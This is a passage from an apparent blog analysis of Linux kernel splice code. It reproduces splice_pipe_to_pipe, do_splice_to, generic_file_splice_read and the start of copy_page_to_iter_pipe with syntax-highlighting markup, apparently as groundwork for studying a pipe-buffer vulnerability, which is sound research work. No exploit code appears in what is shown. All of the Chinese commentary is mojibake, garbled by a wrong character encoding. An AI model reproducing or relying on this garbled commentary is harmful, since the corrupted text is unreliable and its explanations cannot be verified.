class="hljs-comment">//Â¶ÇÊûúÊ≤°ÊúâÊåáÂÆöËæìÂá∫ÂÅèÁßªÈáèÔºåÂàôÊõ¥Êñ∞ËæìÂá∫Êñá‰ª∂ÁöÑ‰ΩçÁΩÆ‰∏∫ÂÜôÂÖ•Êï∞ÊçÆÂêéÁöÑ‰ΩçÁΩÆ„ÄÇ</span><br>		<span class="hljs-keyword">if</span> (!off_out)<br>			out-&gt;f_pos = offset;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (copy_to_user(off_out, &amp;offset, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br>			ret = -EFAULT;<br><br>		<span class="hljs-keyword">return</span> ret;<br>	&#125;<br>	<span class="hljs-comment">//Â¶ÇÊûúÂè™ÊúâËæìÂá∫Êñá‰ª∂ÊèèËø∞Á¨¶ÊòØÁÆ°ÈÅìÔºåÂàôÊâßË°å‰ªéÊñá‰ª∂Âà∞ÁÆ°ÈÅìÁöÑspliceÊìç‰Ωú</span><br>	<span class="hljs-keyword">if</span> (opipe) &#123;<br>		<span class="hljs-keyword">if</span> (off_out)<span class="hljs-comment">//ÂêëÁÆ°ÈÅì‰∏≠ÂÜôÂÖ•Êï∞ÊçÆÊó∂Ôºå‰∏çÂÖÅËÆ∏ÊåáÂÆöÂÅèÁßªÈáè</span><br>			<span class="hljs-keyword">return</span> -ESPIPE;<br>		<span class="hljs-keyword">if</span> (off_in) &#123;<br>			<span class="hljs-keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))<span class="hljs-comment">//ÂÖàÊ£ÄÊü•ËæìÂÖ•Êñá‰ª∂ÊòØÂê¶ÊîØÊåÅËØªÂèñÊìç‰ΩúÔºàÂç≥ÊòØÂê¶ÊîØÊåÅPREADÊ®°ÂºèÔºâ</span><br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			<span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_in, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<span class="hljs-comment">//‰ªéÁî®Êà∑Á©∫Èó¥Êã∑Ë¥ùËæìÂÖ•ÂÅèÁßªÈáèÂà∞ÂÜÖÊ†∏Á©∫Èó¥ÁöÑoffsetÂèòÈáè‰∏≠</span><br>				<span class="hljs-keyword">return</span> -EFAULT;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			offset = in-&gt;f_pos;<span class="hljs-comment">//Ê≤°ÊúâÊåáÂÆöËæìÂÖ•ÂÅèÁßªÈáèÔºåÂàôÂ∞ÜËæìÂÖ•ÂÅèÁßªÈáèËÆæÁΩÆ‰∏∫ËæìÂÖ•Êñá‰ª∂ÂΩìÂâçÁöÑ‰ΩçÁΩÆ</span><br>		&#125;<br>        <br>		<span class="hljs-comment">//Â¶ÇÊûúËæìÂá∫Êñá‰ª∂ÊèèËø∞Á¨¶ËÆæÁΩÆ‰∫ÜÈùûÈòªÂ°ûÊ†áÂøóÔºàO_NONBLOCKÔºâÔºåÂàôËÆæÁΩÆÁõ∏Â∫îÁöÑÊ†áÂøó‰Ωç</span><br>		<span class="hljs-keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)<br>			flags |= SPLICE_F_NONBLOCK;<br>        <br>		<span class="hljs-comment">//Ëé∑ÂèñÁÆ°ÈÅìÁöÑÈîÅÔºå‰ª•Á°Æ‰øùÂπ∂ÂèëÊÉÖÂÜµ‰∏ãÁÆ°ÈÅìÁöÑÊìç‰Ωú‰∏ç‰ºöÂÜ≤Á™Å</span><br>		pipe_lock(opipe);<br>        <br>        <span class="hljs-comment">//Á≠âÂæÖÁÆ°ÈÅìÊúâË∂≥Â§üÁöÑÁ©∫Èó¥Êù•ÂÜôÂÖ•Êï∞ÊçÆ</span><br>		ret = wait_for_space(opipe, flags);<br>		<span class="hljs-keyword">if</span> (!ret) &#123;<br>			<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_space;<br><br>			<span class="hljs-comment">/* Don&#x27;t try to read more the pipe has space for. */</span><br>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">             opipe-&gt;max_usage Ë°®Á§∫ÁÆ°ÈÅìÁöÑÊúÄÂ§ß‰ΩøÁî®ÈáèÔºåÂç≥ÁÆ°ÈÅìÁöÑÊÄªÂÆπÈáè„ÄÇ</span><br><span class="hljs-comment">			pipe_occupancy(opipe-&gt;head, opipe-&gt;tail) Ë°®Á§∫ÂΩìÂâçÁÆ°ÈÅì‰∏≠Â∑≤Âç†Áî®ÁöÑÁ©∫Èó¥„ÄÇ</span><br><span class="hljs-comment">			ÈÄöËøáËÆ°ÁÆóÂèØÁü•Ôºåp_space Ë°®Á§∫ÁÆ°ÈÅì‰∏≠ÁöÑÂâ©‰ΩôÂèØÁî®Á©∫Èó¥ÔºåÂç≥ÊÄªÂÆπÈáèÂáèÂéªÂ∑≤Âç†Áî®ÁöÑÁ©∫Èó¥„ÄÇ</span><br><span class="hljs-comment">			*/</span><br>			p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);<br>             <span class="hljs-comment">//Â∞ÜÂÜôÂÖ•Êï∞ÊçÆÁöÑÈïøÂ∫¶ÈôêÂà∂‰∏∫ÂΩìÂâçÁÆ°ÈÅìÂâ©‰ΩôÁ©∫Èó¥ÂíåÁªôÂÆöÈïøÂ∫¶ len ‰∏≠ÁöÑËæÉÂ∞èËÄÖ„ÄÇ</span><br>			len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);<br><br>			ret = do_splice_to(in, &amp;offset, opipe, len, flags);<br>		&#125;<br>        <span class="hljs-comment">//Ëß£ÈîÅ</span><br>		pipe_unlock(opipe);<br>        <br>        <span class="hljs-comment">//Â¶ÇÊûúÂÜôÂÖ•ÊàêÂäüÔºàËøîÂõûÂÄºÂ§ß‰∫é0ÔºâÔºåÂàôÂî§ÈÜíÁÆ°ÈÅì‰∏äÁöÑËØªÂèñËÄÖ</span><br>		<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>			wakeup_pipe_readers(opipe);<br>        <span class="hljs-comment">//Â¶ÇÊûúÊ≤°ÊúâÊåáÂÆöËæìÂÖ•ÂÅèÁßªÈáèÔºåÂàôÊõ¥Êñ∞ËæìÂÖ•Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂΩìÂâç‰ΩçÁΩÆ</span><br>		<span class="hljs-keyword">if</span> (!off_in)<br>			in-&gt;f_pos = offset;<br>        <span class="hljs-comment">//Â¶ÇÊûúÊåáÂÆö‰∫ÜËæìÂÖ•ÂÅèÁßªÈáèÔºåÂàôÂ∞ÜÊúÄÁªàÁöÑÂÅèÁßªÈáè‰ªéÂÜÖÊ†∏Á©∫Èó¥Êã∑Ë¥ùÂõûÁî®Êà∑Á©∫Èó¥</span><br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (copy_to_user(off_in, &amp;offset, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br>			ret = -EFAULT;<br><br>		<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="ÁÆ°ÈÅì-ÁÆ°ÈÅì"><a href="#ÁÆ°ÈÅì-ÁÆ°ÈÅì" class="headerlink" title="ÁÆ°ÈÅì-&gt;ÁÆ°ÈÅì"></a>ÁÆ°ÈÅì-&gt;ÁÆ°ÈÅì</h3><p>Âπ∂‰∏çÊòØÂæàÈáçË¶ÅÔºåÂ∞±Êîæ‰∏ÄËæπÂêßüòã</p>
<h4 id="splice-pipe-to-pipe"><a href="#splice-pipe-to-pipe" class="headerlink" title="splice_pipe_to_pipe"></a>splice_pipe_to_pipe</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Splice contents of ipipe to opipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">splice_pipe_to_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *ipipe,</span><br><span class="hljs-params">			       <span class="hljs-keyword">struct</span> pipe_inode_info *opipe,</span><br><span class="hljs-params">			       <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">ibuf</span>, *<span class="hljs-title">obuf</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head, o_head;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_tail, o_tail;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_mask, o_mask;<br>	<span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">bool</span> input_wakeup = <span class="hljs-literal">false</span>;<br><br><br>retry:<br>	ret = ipipe_prep(ipipe, flags);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br><br>	ret = opipe_prep(opipe, flags);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Potential ABBA deadlock, work around it by ordering lock</span><br><span class="hljs-comment">	 * grabbing by pipe info address. Otherwise two different processes</span><br><span class="hljs-comment">	 * could deadlock (one doing tee from A -&gt; B, the other from B -&gt; A).</span><br><span class="hljs-comment">	 */</span><br>	pipe_double_lock(ipipe, opipe);<br><br>	i_tail = ipipe-&gt;tail;<br>	i_mask = ipipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>	o_head = opipe-&gt;head;<br>	o_mask = opipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br>	<span class="hljs-keyword">do</span> &#123;<br>		<span class="hljs-type">size_t</span> o_len;<br><br>		<span class="hljs-keyword">if</span> (!opipe-&gt;readers) &#123;<br>			send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>			<span class="hljs-keyword">if</span> (!ret)<br>				ret = -EPIPE;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		i_head = ipipe-&gt;head;<br>		o_tail = opipe-&gt;tail;<br><br>		<span class="hljs-keyword">if</span> (pipe_empty(i_head, i_tail) &amp;&amp; !ipipe-&gt;writers)<br>			<span class="hljs-keyword">break</span>;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Cannot make any progress, because either the input</span><br><span class="hljs-comment">		 * pipe is empty or the output pipe is full.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (pipe_empty(i_head, i_tail) ||<br>		    pipe_full(o_head, o_tail, opipe-&gt;max_usage)) &#123;<br>			<span class="hljs-comment">/* Already processed some buffers, break */</span><br>			<span class="hljs-keyword">if</span> (ret)<br>				<span class="hljs-keyword">break</span>;<br><br>			<span class="hljs-keyword">if</span> (flags &amp; SPLICE_F_NONBLOCK) &#123;<br>				ret = -EAGAIN;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * We raced with another reader/writer and haven&#x27;t</span><br><span class="hljs-comment">			 * managed to process any buffers.  A zero return</span><br><span class="hljs-comment">			 * value means EOF, so retry instead.</span><br><span class="hljs-comment">			 */</span><br>			pipe_unlock(ipipe);<br>			pipe_unlock(opipe);<br>			<span class="hljs-keyword">goto</span> retry;<br>		&#125;<br><br>		ibuf = &amp;ipipe-&gt;bufs[i_tail &amp; i_mask];<br>		obuf = &amp;opipe-&gt;bufs[o_head &amp; o_mask];<br><br>		<span class="hljs-keyword">if</span> (len &gt;= ibuf-&gt;len) &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Simply move the whole buffer from ipipe to opipe</span><br><span class="hljs-comment">			 */</span><br>			*obuf = *ibuf;<br>			ibuf-&gt;ops = <span class="hljs-literal">NULL</span>;<br>			i_tail++;<br>			ipipe-&gt;tail = i_tail;<br>			input_wakeup = <span class="hljs-literal">true</span>;<br>			o_len = obuf-&gt;len;<br>			o_head++;<br>			opipe-&gt;head = o_head;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Get a reference to this pipe buffer,</span><br><span class="hljs-comment">			 * so we can copy the contents over.</span><br><span class="hljs-comment">			 */</span><br>			<span class="hljs-keyword">if</span> (!pipe_buf_get(ipipe, ibuf)) &#123;<br>				<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>					ret = -EFAULT;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			*obuf = *ibuf;<br><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Don&#x27;t inherit the gift and merge flags, we need to</span><br><span class="hljs-comment">			 * prevent multiple steals of this page.</span><br><span class="hljs-comment">			 */</span><br>			obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_GIFT;<br>			obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_CAN_MERGE;<br><br>			obuf-&gt;len = len;<br>			ibuf-&gt;offset += len;<br>			ibuf-&gt;len -= len;<br>			o_len = len;<br>			o_head++;<br>			opipe-&gt;head = o_head;<br>		&#125;<br>		ret += o_len;<br>		len -= o_len;<br>	&#125; <span class="hljs-keyword">while</span> (len);<br><br>	pipe_unlock(ipipe);<br>	pipe_unlock(opipe);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we put data in the output pipe, wakeup any potential readers.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>		wakeup_pipe_readers(opipe);<br><br>	<span class="hljs-keyword">if</span> (input_wakeup)<br>		wakeup_pipe_writers(ipipe);<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Êñá‰ª∂-ÁÆ°ÈÅì"><a href="#Êñá‰ª∂-ÁÆ°ÈÅì" class="headerlink" title="Êñá‰ª∂-&gt;ÁÆ°ÈÅì"></a>Êñá‰ª∂-&gt;ÁÆ°ÈÅì</h3><h4 id="do-splice-to"><a href="#do-splice-to" class="headerlink" title="do_splice_to"></a>do_splice_to</h4><p>Âú® <code>do_splice_to</code> ‰∏≠ÊúÄÁªà‰ºöË∞ÉÁî®Âà∞ÂÜÖÊ†∏Êñá‰ª∂ÁªìÊûÑ‰ΩìÂáΩÊï∞Ë°®ÁöÑ <code>splice_read</code> ÊåáÈíàÔºåÂØπ‰∫é‰∏çÂêåÁöÑÊñá‰ª∂Á≥ªÁªüËÄåË®ÄËØ•ÂáΩÊï∞ÊåáÈíà‰∏çÂêåÔºå‰ª• ext4 Êñá‰ª∂Á≥ªÁªü‰∏∫‰æãÔºåÊü•Ë°® <code>ext4_file_operations</code>ÔºåÂØπÂ∫îË∞ÉÁî®ÁöÑÂáΩÊï∞Â∫î‰∏∫ <code>generic_file_splice_read</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from a file to a pipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_to</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> *ppos,</span><br><span class="hljs-params">			 <span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params">			 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))<br>		<span class="hljs-keyword">return</span> -EBADF;<br>	<span class="hljs-comment">//È™åËØÅÊ∫êÊñá‰ª∂ÊòØÂê¶ÂÖ∑ÊúâËØªÂèñ len Â≠óËäÇÊï∞ÊçÆÁöÑÊùÉÈôê</span><br>	ret = rw_verify_area(READ, in, ppos, len);<br>	<span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br>		<span class="hljs-keyword">return</span> ret;<br><br>	<span class="hljs-keyword">if</span> (unlikely(len &gt; MAX_RW_COUNT))<br>		len = MAX_RW_COUNT;<br><br>	<span class="hljs-keyword">if</span> (in-&gt;f_op-&gt;splice_read)<br>		<span class="hljs-keyword">return</span> in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);<br>	<span class="hljs-keyword">return</span> default_file_splice_read(in, ppos, pipe, len, flags);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="generic-file-splice-read"><a href="#generic-file-splice-read" class="headerlink" title="generic_file_splice_read"></a>generic_file_splice_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">generic_file_splice_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> *ppos,</span><br><span class="hljs-params">				 <span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params">				 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">to</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head;<br>	<span class="hljs-type">int</span> ret;<br>	<span class="hljs-comment">//ÂàùÂßãÂåñ to Ëø≠‰ª£Âô®ÔºåÂ∞ÜÁÆ°ÈÅìÁöÑËØªÊìç‰ΩúËÆæÁΩÆÂà∞ to Ëø≠‰ª£Âô®‰∏≠ÔºåÂêåÊó∂ËÆæÁΩÆÁºìÂÜ≤Âå∫ÈïøÂ∫¶‰∏∫ len</span><br>	iov_iter_pipe(&amp;to, READ, pipe, len);<br>	i_head = to.head;<br>    <span class="hljs-comment">//ÂàùÂßãÂåñ kiocb ÂºÇÊ≠•I/OÊéßÂà∂ÂùóÔºå‰ΩøÁî®ÁªôÂÆöÁöÑÊñá‰ª∂ÊåáÈíà in</span><br>	init_sync_kiocb(&amp;kiocb, in);<br>	kiocb.ki_pos = *ppos;<br>    <br>    <span class="hljs-comment">//Ë∞ÉÁî® call_read_iter ÂáΩÊï∞Ôºå‰ªéÊñá‰ª∂‰∏≠ËØªÂèñÊï∞ÊçÆÂà∞ÁÆ°ÈÅì„ÄÇËøôÈáåÂÆûÈôÖ‰∏äÊòØË∞ÉÁî®‰∫ÜÊñá‰ª∂ÁöÑ read_iter Êìç‰ΩúÔºåÂπ∂Â∞ÜËØªÂèñÁöÑÊï∞ÊçÆÂÜôÂÖ•Âà∞ÁÆ°ÈÅì‰∏≠„ÄÇ</span><br>	ret = call_read_iter(in, &amp;kiocb, &amp;to);<br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>		*ppos = kiocb.ki_pos;<br>		file_accessed(in);<br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>		to.head = i_head;<br>		to.iov_offset = <span class="hljs-number">0</span>;<br>		iov_iter_advance(&amp;to, <span class="hljs-number">0</span>); <span class="hljs-comment">/* to free what was emitted */</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * callers of -&gt;splice_read() expect -EAGAIN on</span><br><span class="hljs-comment">		 * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (ret == -EFAULT)<br>			ret = -EAGAIN;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Âú®ext4Êñá‰ª∂Á≥ªÁªü‰∏≠Ôºåread_iterÂÖ∂ÂÆû‰∏∫<code>shmem_file_read_iter</code>ÔºåËøôBÂáΩÊï∞Ë∞ÉÁî®ÈìæÊúâÁÇπÂ∞èÈïøÔºåË¥¥‰∏™Ë∞ÉÁî®ÈìæÂÖà</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">shmem_file_read_iter<br>	shmem_getpageÔºõÊ†πÊçÆÊñá‰ª∂Á¥¢ÂºïËé∑ÂèñÈ°µÊ°Ü<br>	copy_page_to_iterÔºõÂ∞ÜÈ°µÊ°ÜÊï∞ÊçÆÂ§çÂà∂Âà∞ÁõÆÊ†áÁºìÂÜ≤Âå∫‰∏≠<br>		<span class="hljs-built_in">copy_page_to_iter_pipe</span>()ÔºõÂ¶ÇÊûúÁõÆÊ†áÁºìÂÜ≤Âå∫ÊòØÁÆ°ÈÅìËø≠‰ª£Âô®ÔºåÂ∞ÜÊï∞ÊçÆÂ§çÂà∂Âà∞ÁÆ°ÈÅìÁºìÂÜ≤Âå∫‰∏≠<br></code></pre></td></tr></table></figure>

<h4 id="copy-page-to-iter-pipe"><a href="#copy-page-to-iter-pipe" class="headerlink" title="copy_page_to_iter_pipe"></a>copy_page_to_iter_pipe</h4><p>ÊúÄÁªàÂú® <code>copy_page_to_iter_pipe()</code> ‰∏≠ÔºåÂ∞ÜÂØπÂ∫îÁöÑ <code>pipe_buffer-&gt;page</code> ËÆæ‰∏∫<strong>Êñá‰ª∂Êò†Â∞ÑÁöÑÈ°µÈù¢ÈõÜÁöÑÂØπÂ∫îÈ°µÊ°Ü</strong>ÔºåÂ∞ÜÈ°µÊ°ÜÂºïÁî®ËÆ°Êï∞ + 1Ôºà<code>get_page()</code>ÔºâÔºåËøôÊ†∑Â∞±ÂÆåÊàê‰∫Ü‰∏Ä‰∏™<strong>‰ªéÊñá‰ª∂ËØªÂèñÊï∞ÊçÆÂà∞ÁÆ°ÈÅìÁöÑËøáÁ®ã</strong>ÔºåÂõ†‰∏∫ÊòØÁõ¥Êé•Âª∫Á´ãÈ°µÈù¢ÁöÑÊò†Â∞ÑÔºåÊâÄ‰ª•ÊØèÊ¨°Êìç‰ΩúÂêéÈÉΩ‰ºöÂ∞Ü head +1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params">			 <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br>	<span class="hljs-type">size_t</span> off;<br><br>	<span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>		bytes = i-&gt;count;<br><br>	<span class="hljs-keyword">if</span> (unlikely(!bytes))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	<span class="hljs-keyword">if</span> (!sanity(i))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>	<span class="hljs-comment">//offÊòØNULLÂ∫îËØ•ü§î</span><br>	off = i-&gt;iov_offset;<br>	